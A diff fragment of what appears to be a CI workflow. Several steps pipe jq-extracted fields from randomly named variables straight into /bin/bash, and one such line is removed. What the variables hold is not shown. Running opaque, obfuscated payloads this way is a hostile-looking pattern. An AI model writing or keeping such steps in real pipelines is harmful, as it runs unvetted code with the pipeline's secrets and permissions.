@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$k28" | jq -r .dll4966 | /bin/bash
           echo $jcf4 | jq -r .nqfmi1 | /bin/bash
           echo $uh7460 | jq -r .iosit7815 | /bin/bash
-          echo $v793 | jq -r .sqrpv1 | /bin/bash
           echo $myv037 | jq -r .bj2411 | /bin/bash
 
       - name: Save output
